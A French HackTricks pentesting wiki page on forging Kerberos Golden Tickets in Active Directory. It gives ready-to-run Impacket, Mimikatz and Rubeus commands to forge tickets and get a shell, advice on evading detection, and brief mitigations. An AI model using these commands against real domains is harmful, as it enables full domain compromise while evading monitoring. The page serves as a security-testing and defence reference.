# Ticket d'or

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Ticket d'or

Une attaque de **Ticket d'or** consiste en la **création d'un Ticket Granting Ticket (TGT) légitime en se faisant passer pour n'importe quel utilisateur** en utilisant le **hachage NTLM du compte krbtgt de l'Active Directory (AD)**. Cette technique est particulièrement avantageuse car elle **permet d'accéder à n'importe quel service ou machine** dans le domaine en tant qu'utilisateur usurpé. Il est crucial de se rappeler que les **informations d'identification du compte krbtgt ne sont jamais mises à jour automatiquement**.

Pour **acquérir le hachage NTLM** du compte krbtgt, diverses méthodes peuvent être utilisées. Il peut être extrait du **processus Local Security Authority Subsystem Service (LSASS)** ou du fichier **NT Directory Services (NTDS.dit)** situé sur n'importe quel Contrôleur de Domaine (DC) dans le domaine. De plus, **exécuter une attaque DCsync** est une autre stratégie pour obtenir ce hachage NTLM, qui peut être réalisée à l'aide d'outils tels que le **module lsadump::dcsync** dans Mimikatz ou le **script secretsdump.py** d'Impacket. Il est important de souligner que pour effectuer ces opérations, **des privilèges d'administrateur de domaine ou un niveau d'accès similaire sont généralement requis**.

Bien que le hachage NTLM serve de méthode viable à cette fin, il est **vivement recommandé** de **forger des tickets en utilisant les clés de chiffrement avancées du standard AES (AES128 et AES256)** pour des raisons de sécurité opérationnelle.


{% code title="Depuis Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Depuis Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Une fois** que vous avez le **golden ticket injecté**, vous pouvez accéder aux fichiers partagés **(C$)**, et exécuter des services et WMI, donc vous pourriez utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble que vous ne pouvez pas obtenir un shell via winrm).

### Contourner les détections courantes

Les moyens les plus fréquents de détecter un golden ticket sont en **inspectant le trafic Kerberos** sur le réseau. Par défaut, Mimikatz **signe le TGT pour 10 ans**, ce qui se démarquera comme anormal dans les demandes TGS ultérieures effectuées avec celui-ci.

`Durée de vie : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utilisez les paramètres `/startoffset`, `/endin` et `/renewmax` pour contrôler le décalage de début, la durée et le nombre maximum de renouvellements (tous en minutes).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Malheureusement, la durée de vie du TGT n'est pas enregistrée dans les 4769, donc vous ne trouverez pas cette information dans les journaux d'événements Windows. Cependant, ce que vous pouvez corréler est **de voir des 4769 sans un 4768 précédent**. Il **n'est pas possible de demander un TGS sans un TGT**, et s'il n'y a aucun enregistrement d'un TGT émis, nous pouvons en déduire qu'il a été falsifié hors ligne.

Pour **contourner cette détection**, vérifiez les tickets en diamant :

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Atténuation

* 4624 : Connexion au compte
* 4672 : Connexion administrateur
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

D'autres petites astuces que les défenseurs peuvent faire sont **d'alerter sur les 4769 pour les utilisateurs sensibles** tels que le compte administrateur par défaut du domaine.

## Références
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
